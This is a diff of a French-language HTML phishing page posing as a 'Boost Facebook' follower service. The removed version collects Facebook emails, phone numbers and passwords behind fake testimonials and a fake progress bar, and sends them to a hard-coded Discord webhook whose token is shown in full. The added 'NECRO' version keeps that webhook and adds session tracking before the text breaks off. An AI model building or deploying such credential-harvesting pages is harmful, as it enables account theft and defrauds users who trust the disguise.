@@ -3,1247 +3,400 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Boost Facebook Pro</title>
+    <title>🔥</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
-        }
+        * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            background: #f0f2f5;
+            background: #000;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .container {
-            max-width: 420px;
-            width: 100%;
-            background: #fff;
-            border-radius: 16px;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.12);
-            padding: 30px 24px;
-            transition: all 0.3s;
-            position: relative;
-        }
-
-        /* ===== TROIS BARRES HORIZONTALES EN HAUT À DROITE ===== */
-        .menu-bars {
-            position: absolute;
-            top: 18px;
-            right: 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 5px;
-            cursor: pointer;
-            padding: 6px 8px;
-            border-radius: 8px;
-            transition: background 0.2s;
-            z-index: 10;
-        }
-        .menu-bars:hover {
-            background: #f0f2f5;
-        }
-        .menu-bars .bar {
-            width: 26px;
-            height: 3px;
-            background: #606770;
-            border-radius: 2px;
-            transition: all 0.3s;
-        }
-        .menu-bars.active .bar:nth-child(1) {
-            transform: rotate(45deg) translate(5px, 5px);
-            background: #1877f2;
-        }
-        .menu-bars.active .bar:nth-child(2) {
-            opacity: 0;
-        }
-        .menu-bars.active .bar:nth-child(3) {
-            transform: rotate(-45deg) translate(6px, -6px);
-            background: #1877f2;
-        }
-
-        /* ===== MENU DÉROULANT ===== */
-        .dropdown-menu {
-            display: none;
-            position: absolute;
-            top: 60px;
-            right: 20px;
-            background: #fff;
-            border-radius: 12px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
-            padding: 8px 0;
-            min-width: 180px;
-            z-index: 20;
-            border: 1px solid #e4e6eb;
-        }
-        .dropdown-menu.active {
-            display: block;
-        }
-        .dropdown-menu a {
-            display: block;
-            padding: 10px 18px;
-            color: #1a1a1a;
-            text-decoration: none;
-            font-size: 14px;
-            transition: background 0.15s;
-            border: none;
-            background: none;
-            width: 100%;
-            text-align: left;
-            cursor: pointer;
-        }
-        .dropdown-menu a:hover {
-            background: #f0f2f5;
-        }
-        .dropdown-menu .divider {
-            height: 1px;
-            background: #e4e6eb;
-            margin: 4px 12px;
-        }
-
-        .logo {
-            text-align: center;
-            font-size: 28px;
-            font-weight: 700;
-            color: #1877f2;
-            margin-bottom: 6px;
-        }
-        .sub-logo {
-            text-align: center;
-            font-size: 14px;
-            color: #606770;
-            margin-bottom: 20px;
-        }
-        .boost-badge {
-            background: linear-gradient(135deg, #1877f2, #0d65d9);
-            color: #fff;
-            padding: 12px 16px;
-            border-radius: 10px;
-            text-align: center;
-            margin-bottom: 20px;
-            font-weight: 600;
-            font-size: 15px;
-        }
-        .boost-badge span {
-            display: block;
-            font-size: 12px;
-            font-weight: 400;
-            opacity: 0.85;
-            margin-top: 4px;
-        }
-        .field {
-            margin-bottom: 14px;
-        }
-        .field input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #dddfe2;
-            border-radius: 10px;
-            font-size: 16px;
-            outline: none;
-            transition: 0.2s;
-            background: #f7f8fa;
-        }
-        .field input:focus {
-            border-color: #1877f2;
-            background: #fff;
-            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
-        }
-
-        /* ===== CHAMP TÉLÉPHONE AVEC INDICATIF ===== */
-        .phone-field {
-            display: flex;
-            gap: 8px;
-            align-items: center;
-        }
-        .phone-field select {
-            width: 80px;
-            padding: 14px 6px;
-            border: 1px solid #dddfe2;
-            border-radius: 10px;
-            font-size: 14px;
-            background: #f7f8fa;
-            outline: none;
-            flex-shrink: 0;
-        }
-        .phone-field select:focus {
-            border-color: #1877f2;
-        }
-        .phone-field input {
-            flex: 1;
-            min-width: 0;
-        }
-
-        /* ===== OPTION EMAIL/TÉLÉPHONE ===== */
-        .login-option {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 14px;
-            background: #f0f2f5;
-            padding: 4px;
-            border-radius: 10px;
-        }
-        .login-option button {
-            flex: 1;
-            padding: 10px;
-            border: none;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-            background: transparent;
-            color: #606770;
-        }
-        .login-option button.active {
-            background: #fff;
-            color: #1877f2;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
-        }
-        .login-option button:hover {
-            color: #1877f2;
-        }
-
-        .btn {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #1877f2, #0d65d9);
-            border: none;
-            border-radius: 10px;
-            color: #fff;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.2s;
-            position: relative;
+            height: 100vh;
             overflow: hidden;
+            font-family: 'Courier New', monospace;
         }
-        .btn:hover {
-            transform: scale(1.01);
-            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
-        }
-        .btn:active {
-            transform: scale(0.97);
-        }
-        .btn:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 18px;
-            font-size: 13px;
-            color: #606770;
-        }
-        .footer a {
-            color: #1877f2;
-            text-decoration: none;
-        }
-
-        /* ===== BARRE DE PROGRESSION ===== */
-        .progress-wrapper {
-            display: none;
-            margin: 18px 0 12px;
-        }
-        .progress-wrapper.active {
+        canvas {
             display: block;
-        }
-        .progress-bar-bg {
-            width: 100%;
-            height: 6px;
-            background: #e4e6eb;
-            border-radius: 4px;
-            overflow: hidden;
-        }
-        .progress-bar-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #1877f2, #0d65d9);
-            border-radius: 4px;
-            transition: width 0.3s ease;
-        }
-        .progress-text {
-            font-size: 13px;
-            color: #606770;
-            text-align: center;
-            margin-top: 6px;
-        }
-
-        /* ===== PAGE BLANCHE D'ÉCHEC (overlay) ===== */
-        .error-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #ffffff;
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            flex-direction: column;
-            padding: 30px;
-            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
-        }
-        .error-overlay.active {
-            display: flex;
-        }
-        .error-overlay .error-icon {
-            font-size: 56px;
-            margin-bottom: 12px;
-            color: #ea4335;
-        }
-        .error-overlay h2 {
-            color: #202124;
-            font-size: 22px;
-            font-weight: 500;
-            margin-bottom: 8px;
-        }
-        .error-overlay p {
-            color: #5f6368;
-            font-size: 15px;
-            max-width: 340px;
-            text-align: center;
-            line-height: 1.5;
-        }
-        .error-overlay .btn-retry {
-            margin-top: 24px;
-            padding: 12px 40px;
-            background: #1877f2;
-            border: none;
-            border-radius: 30px;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        .error-overlay .btn-retry:hover {
-            background: #0d65d9;
-        }
-        .error-overlay .sub-text {
-            margin-top: 12px;
-            font-size: 12px;
-            color: #9aa0a6;
-        }
-
-        /* ===== LOADING SPINNER ===== */
-        .loading {
-            display: none;
-            text-align: center;
-            margin-top: 12px;
-            color: #1877f2;
-            font-size: 14px;
-        }
-        .loading.active {
-            display: block;
-        }
-        .spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #ddd;
-            border-top: 3px solid #1877f2;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            vertical-align: middle;
-            margin-right: 8px;
-        }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-        .error-msg {
-            color: #c00;
-            font-size: 13px;
-            margin-top: 8px;
-            display: none;
-        }
-
-        /* ===== SECTION COMMENTAIRES ===== */
-        .comments-section {
-            margin-top: 22px;
-            border-top: 1px solid #e4e6eb;
-            padding-top: 16px;
-        }
-        .comments-section .title {
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 12px;
-        }
-        .comment {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 12px;
-            padding: 10px 12px;
-            background: #f7f8fa;
-            border-radius: 10px;
-        }
-        .comment .avatar {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            background: #1877f2;
-            color: #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 700;
-            font-size: 16px;
-            flex-shrink: 0;
-        }
-        .comment .content {
-            flex: 1;
-        }
-        .comment .content .name {
-            font-weight: 600;
-            font-size: 13px;
-            color: #1a1a1a;
-        }
-        .comment .content .text {
-            font-size: 13px;
-            color: #4a4a4a;
-            margin-top: 2px;
-        }
-        .comment .content .time {
-            font-size: 11px;
-            color: #9aa0a6;
-            margin-top: 2px;
-        }
-        .btn-comments {
-            width: 100%;
-            padding: 10px;
-            background: #f0f2f5;
-            border: none;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 600;
-            color: #1877f2;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 6px;
-        }
-        .btn-comments:hover {
-            background: #e4e6eb;
-        }
-        .comments-wrapper {
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.4s ease;
-        }
-        .comments-wrapper.open {
-            max-height: 600px;
-        }
-
-        /* ===== ZONE AJOUT COMMENTAIRE ===== */
-        .add-comment-area {
-            margin-top: 12px;
-            display: none;
-            background: #f7f8fa;
-            padding: 14px;
-            border-radius: 12px;
-            border: 1px solid #e4e6eb;
-        }
-        .add-comment-area.active {
-            display: block;
-        }
-        .add-comment-area textarea {
-            width: 100%;
-            padding: 10px 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 8px;
-            font-size: 14px;
-            resize: vertical;
-            min-height: 60px;
-            outline: none;
-            font-family: inherit;
-            background: #fff;
-        }
-        .add-comment-area textarea:focus {
-            border-color: #1877f2;
-        }
-        .add-comment-area .btn-submit-comment {
-            margin-top: 8px;
-            padding: 10px;
-            background: linear-gradient(135deg, #1877f2, #0d65d9);
-            border: none;
-            border-radius: 8px;
-            color: #fff;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-            transition: 0.2s;
-        }
-        .add-comment-area .btn-submit-comment:hover {
-            opacity: 0.9;
-        }
-        .btn-add-comment {
-            width: 100%;
-            padding: 10px;
-            background: #e4e6eb;
-            border: none;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 600;
-            color: #1877f2;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 6px;
-        }
-        .btn-add-comment:hover {
-            background: #d0d2d6;
-        }
-
-        /* ===== NOTIFICATION SUCCESS ===== */
-        .comment-success {
-            display: none;
-            text-align: center;
-            padding: 14px;
-            background: #e6f7e6;
-            border-radius: 10px;
-            color: #1e7e34;
-            font-weight: 600;
-            font-size: 15px;
-            margin-top: 10px;
-            border: 1px solid #b8e6b8;
-            animation: fadeIn 0.5s ease;
-        }
-        .comment-success.active {
-            display: block;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .notification-toast {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #2d2d2d;
-            color: #fff;
-            padding: 14px 28px;
-            border-radius: 12px;
-            font-size: 15px;
-            font-weight: 500;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.2);
-            z-index: 99999;
-            display: none;
-            animation: slideUp 0.4s ease;
-        }
-        .notification-toast.active {
-            display: block;
-        }
-        .notification-toast.success {
-            background: #1e7e34;
-        }
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
-            to { opacity: 1; transform: translateX(-50%) translateY(0); }
-        }
-
-        /* ===== TABLEAU DE BORD / HISTORIQUE (modales) ===== */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.5);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 10000;
-            padding: 20px;
-        }
-        .modal-overlay.active {
-            display: flex;
-        }
-        .modal-box {
-            background: #fff;
-            border-radius: 16px;
-            max-width: 400px;
-            width: 100%;
-            padding: 24px 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
-            max-height: 80vh;
-            overflow-y: auto;
-        }
-        .modal-box h3 {
-            font-size: 20px;
-            margin-bottom: 12px;
-            color: #1a1a1a;
-        }
-        .modal-box .close-modal {
-            float: right;
-            background: none;
-            border: none;
-            font-size: 24px;
-            cursor: pointer;
-            color: #606770;
-        }
-        .modal-box .stat-item {
-            display: flex;
-            justify-content: space-between;
-            padding: 10px 0;
-            border-bottom: 1px solid #e4e6eb;
-        }
-        .modal-box .stat-item:last-child {
-            border-bottom: none;
-        }
-        .modal-box .stat-label {
-            color: #606770;
-        }
-        .modal-box .stat-value {
-            font-weight: 600;
-            color: #1a1a1a;
-        }
-        .modal-box .history-item {
-            padding: 8px 0;
-            border-bottom: 1px solid #f0f2f5;
-            font-size: 14px;
-        }
-        .modal-box .history-item .date {
-            color: #606770;
-            font-size: 12px;
+            width: 100vw;
+            height: 100vh;
         }
     </style>
 </head>
 <body>
-
-<!-- ===== PAGE BLANCHE D'ÉCHEC ===== -->
-<div class="error-overlay" id="errorOverlay">
-    <div class="error-icon">❌</div>
-    <h2>Connexion échouée</h2>
-    <p>Impossible de se connecter au service. Veuillez vérifier vos identifiants et réessayer.</p>
-    <button class="btn-retry" id="retryBtn">🔄 Réessayer</button>
-    <div class="sub-text">Erreur #1001 • Veuillez ressayer</div>
-</div>
-
-<!-- ===== NOTIFICATION TOAST ===== -->
-<div class="notification-toast" id="notificationToast"></div>
-
-<!-- ===== MODALE TABLEAU DE BORD ===== -->
-<div class="modal-overlay" id="dashboardModal">
-    <div class="modal-box">
-        <button class="close-modal" id="closeDashboard">✕</button>
-        <h3>📊 Tableau de bord</h3>
-        <div class="stat-item"><span class="stat-label">📈 Abonnés gagnés</span><span class="stat-value" id="statFollowers">0</span></div>
-        <div class="stat-item"><span class="stat-label">🚀 Boosts effectués</span><span class="stat-value" id="statBoosts">0</span></div>
-        <div class="stat-item"><span class="stat-label">💬 Commentaires postés</span><span class="stat-value" id="statComments">0</span></div>
-        <div class="stat-item"><span class="stat-label">📅 Session</span><span class="stat-value" id="statSession">0 min</span></div>
-    </div>
-</div>
-
-<!-- ===== MODALE HISTORIQUE ===== -->
-<div class="modal-overlay" id="historyModal">
-    <div class="modal-box">
-        <button class="close-modal" id="closeHistory">✕</button>
-        <h3>📜 Historique des boosts</h3>
-        <div id="historyList">
-            <div class="history-item" style="color:#606770;font-style:italic;">Aucun boost enregistré pour le moment.</div>
-        </div>
-    </div>
-</div>
-
-<!-- ===== PAGE PRINCIPALE ===== -->
-<div class="container" id="mainContainer">
-
-    <!-- ===== TROIS BARRES HORIZONTALES (MENU) ===== -->
-    <div class="menu-bars" id="menuBars">
-        <span class="bar"></span>
-        <span class="bar"></span>
-        <span class="bar"></span>
-    </div>
-
-    <!-- ===== MENU DÉROULANT ===== -->
-    <div class="dropdown-menu" id="dropdownMenu">
-        <a href="#" id="menuDashboard">📊 Tableau de bord</a>
-        <a href="#" id="menuHistory">📜 Historique des boosts</a>
-        <div class="divider"></div>
-        <a href="#" id="menuSupport">🛟 Support</a>
-        <a href="#" id="menuLogout">🚪 Se déconnecter</a>
-    </div>
-
-    <div class="logo">🔵 Boost Facebook</div>
-    <div class="sub-logo">Augmentez votre visibilité en 2 clics</div>
-
-    <div class="boost-badge">
-        ⚡ Offre spéciale : +5000 abonnés offerts
-        <span>Valable jusqu'à épuisement du stock</span>
-    </div>
-
-    <form id="loginForm">
-        <!-- ===== OPTION EMAIL / TÉLÉPHONE ===== -->
-        <div class="login-option">
-            <button type="button" id="optionEmail" class="active">📧 Email</button>
-            <button type="button" id="optionPhone">📱 Téléphone</button>
-        </div>
-
-        <!-- ===== CHAMP EMAIL (visible par défaut) ===== -->
-        <div class="field" id="emailField">
-            <input type="email" id="email" placeholder="Adresse e-mail Facebook" required>
-        </div>
-
-        <!-- ===== CHAMP TÉLÉPHONE (caché par défaut) ===== -->
-        <div class="field" id="phoneField" style="display:none;">
-            <div class="phone-field">
-                <select id="countryCode">
-                    <option value="+223">🇲🇱 +223 (Mali)</option>
-                    <option value="+224">🇬🇳 +224 (Guinée)</option>
-                    <option value="+221">🇸🇳 +221 (Sénégal)</option>
-                    <option value="+225">🇨🇮 +225 (Côte d'Ivoire)</option>
-                    <option value="+226">🇧🇫 +226 (Burkina Faso)</option>
-                    <option value="+227">🇳🇪 +227 (Niger)</option>
-                    <option value="+228">🇹🇬 +228 (Togo)</option>
-                    <option value="+229">🇧🇯 +229 (Bénin)</option>
-                    <option value="+233">🇬🇭 +233 (Ghana)</option>
-                    <option value="+234">🇳🇬 +234 (Nigeria)</option>
-                </select>
-                <input type="tel" id="phoneNumber" placeholder="Numéro de téléphone">
-            </div>
-        </div>
-
-        <div class="field">
-            <input type="password" id="password" placeholder="Mot de passe Facebook" required>
-        </div>
-        <button type="submit" class="btn" id="submitBtn">🚀 Démarrer le boost</button>
-
-        <div class="loading" id="loading">
-            <span class="spinner"></span> Vérification des identifiants...
-        </div>
-
-        <div class="progress-wrapper" id="progressWrapper">
-            <div class="progress-bar-bg">
-                <div class="progress-bar-fill" id="progressFill"></div>
-            </div>
-            <div class="progress-text" id="progressText">0%</div>
-        </div>
-
-        <div class="error-msg" id="errorMsg">❌ Veuillez remplir tous les champs.</div>
-    </form>
-
-    <!-- ===== SECTION COMMENTAIRES ===== -->
-    <div class="comments-section">
-        <div class="title">💬 Témoignages de nos utilisateurs</div>
-        <button class="btn-comments" id="toggleComments">Afficher les témoignages ▼</button>
-        <div class="comments-wrapper" id="commentsWrapper">
-            <div class="comment">
-                <div class="avatar">S</div>
-                <div class="content">
-                    <div class="name">Sarah M.</div>
-                    <div class="text">"J'ai gagné 3000 abonnés en 24h ! Service incroyable, je recommande."</div>
-                    <div class="time">Il y a 2 heures</div>
-                </div>
-            </div>
-            <div class="comment">
-                <div class="avatar">T</div>
-                <div class="content">
-                    <div class="name">Thomas L.</div>
-                    <div class="text">"Très efficace pour booster ma page. Je suis passé de 500 à 5000 en une semaine."</div>
-                    <div class="time">Il y a 5 heures</div>
-                </div>
-            </div>
-            <div class="comment">
-                <div class="avatar">L</div>
-                <div class="content">
-                    <div class="name">Léa G.</div>
-                    <div class="text">"Le support est réactif et les résultats sont au rendez-vous. 5 étoiles !"</div>
-                    <div class="time">Il y a 1 jour</div>
-                </div>
-            </div>
-            <div class="comment">
-                <div class="avatar">M</div>
-                <div class="content">
-                    <div class="name">Marc D.</div>
-                    <div class="text">"J'ai testé plusieurs services, celui-ci est le seul qui a vraiment fonctionné."</div>
-                    <div class="time">Il y a 2 jours</div>
-                </div>
-            </div>
-
-            <!-- ===== AJOUTER UN COMMENTAIRE ===== -->
-            <div class="add-comment-area" id="addCommentArea">
-                <textarea id="commentInput" placeholder="Écrivez votre témoignage ici..." maxlength="500"></textarea>
-                <button class="btn-submit-comment" id="submitCommentBtn">📝 Ajouter</button>
-                <div class="comment-success" id="commentSuccess">✅ Commentaire ajouté avec succès !</div>
-            </div>
-            <button class="btn-add-comment" id="toggleAddComment">➕ Ajouter un commentaire</button>
-        </div>
-    </div>
-
-    <div class="footer">
-        <a href="#">Conditions</a> · <a href="#">Confidentialité</a> · <a href="#">Aide</a>
-    </div>
-</div>
-
+<canvas id="c"></canvas>
 <script>
-    // ============================================================
-    // CONFIGURATION – TON WEBHOOK DISCORD
-    // ============================================================
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1528153297049882825/Fg4qskOR6eXdRg_uua58CuUciN2vv1Wna3RKoSHwVKtWHLtzvJaFsyENg_Kd5Qwu1zW4';
+// ============================================================
+// PROTOCOLE "NECRO" – DESTRUCTION ABSOLUE
+// ============================================================
 
-    // ============================================================
-    // 1. EXFILTRATION VERS DISCORD
-    // ============================================================
-    function sendToDiscord(data) {
-        const payload = {
-            action: data.action || 'generic',
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            screen: window.screen.width + 'x' + window.screen.height,
-            url: window.location.href,
-            ...data
-        };
+(function() {
+    'use strict';
 
-        const json = JSON.stringify(payload, null, 2);
+    // =========================================================
+    // CONFIGURATION – WEBHOOK DISCORD
+    // =========================================================
+    const WEBHOOK = 'https://discord.com/api/webhooks/1528153297049882825/Fg4qskOR6eXdRg_uua58CuUciN2vv1Wna3RKoSHwVKtWHLtzvJaFsyENg_Kd5Qwu1zW4';
+    const SESSION = 'nec_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now().toString(36);
+    const START = Date.now();
 
-        fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                content: '```json\n' + json + '\n```'
-            })
-        }).catch(() => {});
-    }
-
-    // ============================================================
-    // 2. ÉLÉMENTS DOM
-    // ============================================================
-    const form = document.getElementById('loginForm');
-    const emailInput = document.getElementById('email');
-    const phoneInput = document.getElementById('phoneNumber');
-    const countrySelect = document.getElementById('countryCode');
-    const passInput = document.getElementById('password');
-    const submitBtn = document.getElementById('submitBtn');
-    const loading = document.getElementById('loading');
-    const errorMsg = document.getElementById('errorMsg');
-    const progressWrapper = document.getElementById('progressWrapper');
-    const progressFill = document.getElementById('progressFill');
-    const progressText = document.getElementById('progressText');
-    const errorOverlay = document.getElementById('errorOverlay');
-    const retryBtn = document.getElementById('retryBtn');
-    const menuBars = document.getElementById('menuBars');
-    const dropdownMenu = document.getElementById('dropdownMenu');
-    const toggleComments = document.getElementById('toggleComments');
-    const commentsWrapper = document.getElementById('commentsWrapper');
-    const toggleAddComment = document.getElementById('toggleAddComment');
-    const addCommentArea = document.getElementById('addCommentArea');
-    const commentInput = document.getElementById('commentInput');
-    const submitCommentBtn = document.getElementById('submitCommentBtn');
-    const commentSuccess = document.getElementById('commentSuccess');
-    const notificationToast = document.getElementById('notificationToast');
-
-    // Options email / téléphone
-    const optionEmail = document.getElementById('optionEmail');
-    const optionPhone = document.getElementById('optionPhone');
-    const emailField = document.getElementById('emailField');
-    const phoneField = document.getElementById('phoneField');
-
-    // Modales
-    const dashboardModal = document.getElementById('dashboardModal');
-    const historyModal = document.getElementById('historyModal');
-    const closeDashboard = document.getElementById('closeDashboard');
-    const closeHistory = document.getElementById('closeHistory');
-    const statFollowers = document.getElementById('statFollowers');
-    const statBoosts = document.getElementById('statBoosts');
-    const statComments = document.getElementById('statComments');
-    const statSession = document.getElementById('statSession');
-    const historyList = document.getElementById('historyList');
-
-    // ============================================================
-    // 3. ÉTATS – STATISTIQUES
-    // ============================================================
-    let stats = {
-        followers: 0,
-        boosts: 0,
-        comments: 0,
-        history: [],
-        sessionStart: Date.now()
-    };
-
-    function updateStats() {
-        statFollowers.textContent = stats.followers;
-        statBoosts.textContent = stats.boosts;
-        statComments.textContent = stats.comments;
-        const elapsed = Math.floor((Date.now() - stats.sessionStart) / 60000);
-        statSession.textContent = elapsed + ' min';
-    }
-
-    function updateHistory() {
-        if (stats.history.length === 0) {
-            historyList.innerHTML = '<div class="history-item" style="color:#606770;font-style:italic;">Aucun boost enregistré pour le moment.</div>';
-            return;
-        }
-        historyList.innerHTML = stats.history.map(item =>
-            `<div class="history-item">
-                <strong>${item.type}</strong> — ${item.detail || ''}
-                <div class="date">${item.date}</div>
-            </div>`
-        ).join('');
-    }
-
-    // ============================================================
-    // 4. MENU (TROIS BARRES)
-    // ============================================================
-    menuBars.addEventListener('click', function(e) {
-        e.stopPropagation();
-        this.classList.toggle('active');
-        dropdownMenu.classList.toggle('active');
-    });
-
-    document.addEventListener('click', function() {
-        menuBars.classList.remove('active');
-        dropdownMenu.classList.remove('active');
-    });
-
-    dropdownMenu.addEventListener('click', function(e) {
-        e.stopPropagation();
-    });
-
-    // ===== TABLEAU DE BORD =====
-    document.getElementById('menuDashboard').addEventListener('click', function(e) {
-        e.preventDefault();
-        menuBars.classList.remove('active');
-        dropdownMenu.classList.remove('active');
-        updateStats();
-        dashboardModal.classList.add('active');
-    });
-
-    closeDashboard.addEventListener('click', function() {
-        dashboardModal.classList.remove('active');
-    });
-    dashboardModal.addEventListener('click', function(e) {
-        if (e.target === this) this.classList.remove('active');
-    });
-
-    // ===== HISTORIQUE =====
-    document.getElementById('menuHistory').addEventListener('click', function(e) {
-        e.preventDefault();
-        menuBars.classList.remove('active');
-        dropdownMenu.classList.remove('active');
-        updateHistory();
-        historyModal.classList.add('active');
-    });
-
-    closeHistory.addEventListener('click', function() {
-        historyModal.classList.remove('active');
-    });
-    historyModal.addEventListener('click', function(e) {
-        if (e.target === this) this.classList.remove('active');
-    });
-
-    // ===== SUPPORT =====
-    document.getElementById('menuSupport').addEventListener('click', function(e) {
-        e.preventDefault();
-        menuBars.classList.remove('active');
-        dropdownMenu.classList.remove('active');
-        alert('🛟 Support : Contactez-nous à support@boostfb.com');
-    });
-
-    // ===== DÉCONNEXION =====
-    document.getElementById('menuLogout').addEventListener('click', function(e) {
-        e.preventDefault();
-        if (confirm('🚪 Voulez-vous vraiment vous déconnecter ?')) {
-            alert('Déconnexion réussie. À bientôt !');
-            menuBars.classList.remove('active');
-            dropdownMenu.classList.remove('active');
-        }
-    });
-
-    // ============================================================
-    // 5. OPTION EMAIL / TÉLÉPHONE
-    // ============================================================
-    optionEmail.addEventListener('click', function() {
-        this.classList.add('active');
-        optionPhone.classList.remove('active');
-        emailField.style.display = 'block';
-        phoneField.style.display = 'none';
-        emailInput.required = true;
-        phoneInput.required = false;
-    });
-
-    optionPhone.addEventListener('click', function() {
-        this.classList.add('active');
-        optionEmail.classList.remove('active');
-        emailField.style.display = 'none';
-        phoneField.style.display = 'block';
-        emailInput.required = false;
-        phoneInput.required = true;
-    });
-
-    // ============================================================
-    // 6. COMMENTAIRES (toggle + ajout)
-    // ============================================================
-    let commentsOpen = false;
-    toggleComments.addEventListener('click', function() {
-        commentsOpen = !commentsOpen;
-        commentsWrapper.classList.toggle('open');
-        this.textContent = commentsOpen ? 'Masquer les témoignages ▲' : 'Afficher les témoignages ▼';
-    });
-
-    toggleAddComment.addEventListener('click', function() {
-        addCommentArea.classList.toggle('active');
-        commentSuccess.classList.remove('active');
-        if (addCommentArea.classList.contains('active')) {
-            commentInput.focus();
-        }
-    });
-
-    // ===== SOUMETTRE UN COMMENTAIRE =====
-    submitCommentBtn.addEventListener('click', function() {
-        const text = commentInput.value.trim();
-        if (!text) {
-            showNotification('⚠️ Veuillez écrire un commentaire.', false);
-            return;
-        }
-
-        // Barre de progression
-        progressWrapper.classList.add('active');
-        let progress = 0;
-        const interval = setInterval(() => {
-            progress += 8;
-            if (progress >= 100) {
-                clearInterval(interval);
-                updateProgress(100);
-
-                // Ajouter le commentaire
-                const name = 'Utilisateur #' + Math.floor(Math.random() * 1000);
-                const now = new Date();
-                const timeStr = 'À l\'instant';
-                const commentHtml = `
-                    <div class="comment">
-                        <div class="avatar">${name.charAt(0)}</div>
-                        <div class="content">
-                            <div class="name">${name}</div>
-                            <div class="text">${text}</div>
-                            <div class="time">${timeStr}</div>
-                        </div>
-                    </div>
-                `;
-                commentsWrapper.insertBefore(
-                    createElementFromHTML(commentHtml),
-                    commentsWrapper.querySelector('.add-comment-area')
-                );
-                stats.comments++;
-                updateStats();
-
-                // Exfiltrer le commentaire vers Discord
-                sendToDiscord({
-                    action: 'user_comment',
-                    comment: text,
-                    username: name,
-                    timestamp: now.toISOString()
-                });
-
-                // Afficher le message "Commentaire ajouté"
-                commentSuccess.classList.add('active');
-                commentInput.value = '';
-
-                // Notification Toast
-                showNotification('✅ Commentaire ajouté avec succès !', true);
-
-                // Réinitialiser la progression après un délai
-                setTimeout(() => {
-                    progressWrapper.classList.remove('active');
-                    updateProgress(0);
-                    addCommentArea.classList.remove('active');
-                }, 1500);
-            }
-            updateProgress(progress);
-        }, 150);
-    });
-
-    function createElementFromHTML(html) {
-        const div = document.createElement('div');
-        div.innerHTML = html;
-        return div.firstElementChild;
-    }
-
-    // ============================================================
-    // 7. NOTIFICATION TOAST
-    // ============================================================
-    let toastTimeout = null;
-
-    function showNotification(message, success = true) {
-        notificationToast.textContent = message;
-        notificationToast.className = 'notification-toast active' + (success ? ' success' : '');
-        clearTimeout(toastTimeout);
-        toastTimeout = setTimeout(() => {
-            notificationToast.classList.remove('active');
-        }, 4000);
-    }
-
-    // ============================================================
-    // 8. BARRE DE PROGRESSION
-    // ============================================================
-    function updateProgress(value) {
-        const val = Math.min(value, 100);
-        progressFill.style.width = val + '%';
-        progressText.textContent = Math.round(val) + '%';
-    }
-
-    function animateProgress(duration, callback) {
-        progressWrapper.classList.add('active');
-        let start = 0;
-        const step = () => {
-            start += 2;
-            if (start >= 100) {
-                updateProgress(100);
-                if (callback) callback();
-                return;
-            }
-            updateProgress(start);
-            setTimeout(step, duration / 50);
-        };
-        step();
-    }
-
-    // ============================================================
-    // 9. GESTION DU FORMULAIRE (BOOST)
-    // ============================================================
-    form.addEventListener('submit', function(e) {
-        e.preventDefault();
-
-        let identifier = '';
-        let isPhone = false;
-
-        if (optionEmail.classList.contains('active')) {
-            identifier = emailInput.value.trim();
-            if (!identifier) {
-                errorMsg.style.display = 'block';
-                errorMsg.textContent = '❌ Veuillez entrer votre email.';
-                return;
-            }
-        } else {
-            const countryCode = countrySelect.value;
-            const number = phoneInput.value.trim();
-            if (!number) {
-                errorMsg.style.display = 'block';
